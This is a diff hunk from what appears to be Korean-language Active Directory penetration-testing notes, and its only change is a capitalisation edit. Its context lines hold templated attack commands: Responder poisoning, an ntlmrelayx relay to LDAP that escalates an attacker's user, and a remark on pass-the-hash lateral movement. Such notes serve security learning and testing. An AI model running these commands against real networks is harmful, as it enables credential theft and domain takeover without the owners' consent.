@@ -99,7 +99,7 @@ sudo responder -I <iface> -wd
 impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <attacker_user>
 ```
 
-capture된 credential은 종종 **로컬 관리자 권한이 광범위하게 부여**되어 있음 → 즉시 PtH 로 횡적 이동.
+capture된 credential은 종종 **로컬 관리자 권한이 광범위하게 부여**되어 있음 → 즉시 PTH 로 횡적 이동.
 
 ---
 
